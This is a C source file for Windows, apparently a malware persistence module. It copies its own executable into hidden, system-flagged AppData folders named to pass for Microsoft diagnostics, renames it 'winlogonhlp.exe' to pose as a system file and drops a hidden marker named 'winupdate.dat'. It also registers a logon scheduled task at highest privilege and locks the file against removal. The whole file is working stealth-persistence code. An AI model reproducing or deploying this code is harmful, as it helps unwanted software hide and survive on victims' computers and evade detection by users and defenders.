#include "persistence.h"
#include <windows.h>
#include <shlwapi.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <wchar.h>
#include <wctype.h>
#define _WIN32_IE 0x0500
#include <shlobj.h>
#include <userenv.h>

WCHAR g_installedPath[MAX_PATH] = {0};

// 检查管理员权限
BOOL is_admin() {
    printf("[Security] Checking admin privileges...\n");
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    printf("[Security] Admin check completed: %s\n", isAdmin ? "Admin" : "Not admin");
    return isAdmin;
}

// 文件锁定线程
DWORD WINAPI lock_file_thread(LPVOID lpParam) {
    LPCWSTR filePath = (LPCWSTR)lpParam;
    wprintf(L"[Lock] Starting file lock thread for: %ls\n", filePath);
    
    int retry_count = 0;
    const int max_retries = 10;
    
    while (retry_count < max_retries) {
        wprintf(L"[Lock] Attempting to open file: %ls\n", filePath);
        HANDLE hFile = CreateFileW(
            filePath, 
            GENERIC_READ, 
            FILE_SHARE_READ, 
            NULL, 
            OPEN_EXISTING, 
            0, 
            NULL
        );
        
        if (hFile != INVALID_HANDLE_VALUE) {
            wprintf(L"[Lock] File opened successfully, locking...\n");
            
            // 尝试锁定文件
            if (LockFile(hFile, 0, 0, MAXDWORD, MAXDWORD)) {
                wprintf(L"[Lock] File locked successfully: %ls\n", filePath);
                
                // 保持锁定状态
                while (TRUE) {
                    Sleep(60000);
                    wprintf(L"[Lock] File lock maintained: %ls\n", filePath);
                }
            } else {
                DWORD err = GetLastError();
                printf("[Lock] LockFile failed: %d\n", err);
            }
            CloseHandle(hFile);
        } else {
            DWORD err = GetLastError();
            printf("[Lock] CreateFileW failed: %d\n", err);
        }
        
        // 重试前等待
        retry_count++;
        if (retry_count < max_retries) {
            printf("[Lock] Retrying in 5 seconds...\n");
            Sleep(5000);
        }
    }
    
    printf("[Lock] File lock thread exiting after %d attempts\n", max_retries);
    return 0;
}

// 创建深层路径（统一使用用户目录）
BOOL create_deep_path(WCHAR* deepPath) {
    printf("[Path] Creating deep path structure...\n");
    
    static const WCHAR* dirs[] = {
        L"Microsoft", L"Diagnostics", L"SystemLogs", L"Backup", NULL
    };
    
    // 获取用户AppData目录
    WCHAR appDataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        printf("[Path] SHGetFolderPathW failed: %d\n", GetLastError());
        return FALSE;
    }
    wprintf(L"[Path] AppData path: %ls\n", appDataPath);
    
    wcscpy_s(deepPath, MAX_PATH, appDataPath);
    
    // 确保路径以反斜杠结尾
    size_t len = wcslen(deepPath);
    if (len > 0 && deepPath[len-1] != L'\\') {
        wcscat_s(deepPath, MAX_PATH, L"\\");
        printf("[Path] Appended backslash to path\n");
    }
    
    // 构建完整路径
    for (int i = 0; dirs[i]; i++) {
        wcscat_s(deepPath, MAX_PATH, dirs[i]);
        wcscat_s(deepPath, MAX_PATH, L"\\");
        wprintf(L"[Path] Building path: %ls\n", deepPath);
        
        if (!CreateDirectoryW(deepPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                printf("[Path] CreateDirectoryW failed: %d\n", GetLastError());
                return FALSE;
            } else {
                printf("[Path] Directory already exists\n");
            }
        } else {
            printf("[Path] Directory created\n");
        }
        
        if (!SetFileAttributesW(deepPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
            printf("[Path] SetFileAttributesW failed: %d\n", GetLastError());
        } else {
            printf("[Path] Attributes set to hidden and system\n");
        }
    }
    
    wprintf(L"[Path] Deep path created: %ls\n", deepPath);
    return TRUE;
}

// 构建安装路径（不实际创建目录）
BOOL build_install_path(WCHAR* path, size_t size) {
    printf("[Path] Building install path...\n");
    
    WCHAR appDataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        printf("[Path] SHGetFolderPathW failed: %d\n", GetLastError());
        return FALSE;
    }
    wprintf(L"[Path] AppData path: %ls\n", appDataPath);
    
    wcscpy_s(path, size, appDataPath);
    
    // 确保路径格式正确
    size_t len = wcslen(path);
    if (len > 0 && path[len-1] != L'\\') {
        wcscat_s(path, size, L"\\");
        printf("[Path] Appended backslash to path\n");
    }
    
    // 添加深层目录结构
    static const WCHAR* dirs[] = {
        L"Microsoft\\", L"Diagnostics\\", L"SystemLogs\\", L"Backup\\", NULL
    };
    
    for (int i = 0; dirs[i]; i++) {
        wcscat_s(path, size, dirs[i]);
        wprintf(L"[Path] Added directory: %ls\n", dirs[i]);
    }
    
    wprintf(L"[Path] Final install path: %ls\n", path);
    return TRUE;
}

// 安装计划任务
BOOL install_scheduled_task(LPCWSTR taskPath) {
    printf("[Task] Installing scheduled task...\n");
    
    WCHAR username[256];
    DWORD size = 256;
    if (!GetUserNameW(username, &size)) {
        printf("[Task] GetUserNameW failed: %d\n", GetLastError());
        return FALSE;
    }
    wprintf(L"[Task] Current username: %ls\n", username);
    
    // 构建任务命令
    WCHAR command[1024];
    swprintf_s(command, 1024, 
              L"schtasks /create /tn \"UserEventTask\" /tr \"\\\"%ls\\\"\" /sc ONLOGON /ru %ls /rl HIGHEST /f",
              taskPath, username);
    
    wprintf(L"[Task] Task command: %ls\n", command);
    
    // 执行命令
    PROCESS_INFORMATION pi;
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    if (CreateProcessW(NULL, command, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[Task] CreateProcess succeeded, waiting for completion...\n");
        WaitForSingleObject(pi.hProcess, 5000);
        
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
            if (exitCode == 0) {
                printf("[Task] Scheduled task created successfully\n");
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return TRUE;
            } else {
                printf("[Task] Task creation failed with exit code: %d\n", exitCode);
            }
        } else {
            printf("[Task] GetExitCodeProcess failed: %d\n", GetLastError());
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[Task] CreateProcess failed: %d\n", GetLastError());
    }
    
    return FALSE;
}

// 持久化安装（统一目录）
void install_persistence() {
    printf("===== Starting persistence installation =====\n");
    
    // 获取当前文件路径
    WCHAR selfPath[MAX_PATH] = {0};
    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) {
        printf("[Error] GetModuleFileName failed\n");
        return;
    }
    wprintf(L"[Path] Current executable path: %ls\n", selfPath);

    // 创建深层路径
    WCHAR deepDir[MAX_PATH] = {0};
    if (!create_deep_path(deepDir)) {
        printf("[Error] create_deep_path failed\n");
        return;
    }

    // 构建目标路径
    wcscpy_s(g_installedPath, MAX_PATH, deepDir);
    wcscat_s(g_installedPath, MAX_PATH, L"winlogonhlp.exe");
    wprintf(L"[Path] Target installation path: %ls\n", g_installedPath);
    
    // 复制文件
    if (CopyFileW(selfPath, g_installedPath, FALSE)) {
        printf("[File] File copied successfully\n");
        
        // 设置文件属性
        if (SetFileAttributesW(g_installedPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
            printf("[File] File attributes set to hidden and system\n");
        } else {
            printf("[File] SetFileAttributesW failed: %d\n", GetLastError());
        }
        
        // 创建安装标记
        WCHAR markerPath[MAX_PATH];
        wcscpy_s(markerPath, MAX_PATH, deepDir);
        wcscat_s(markerPath, MAX_PATH, L"winupdate.dat");
        wprintf(L"[File] Creating marker file: %ls\n", markerPath);
        
        HANDLE hFile = CreateFileW(markerPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, "INSTALLED", 9, &written, NULL);
            CloseHandle(hFile);
            printf("[File] Marker file created\n");
        } else {
            printf("[File] CreateFileW failed: %d\n", GetLastError());
        }
        
        // 安装计划任务
        if (install_scheduled_task(g_installedPath)) {
            printf("[Task] Persistence installed via scheduled task\n");
        } else {
            printf("[Task] Persistence installation failed\n");
        }
    } else {
        printf("[File] CopyFile failed: %d\n", GetLastError());
    }
    
    printf("===== Persistence installation completed =====\n");
}
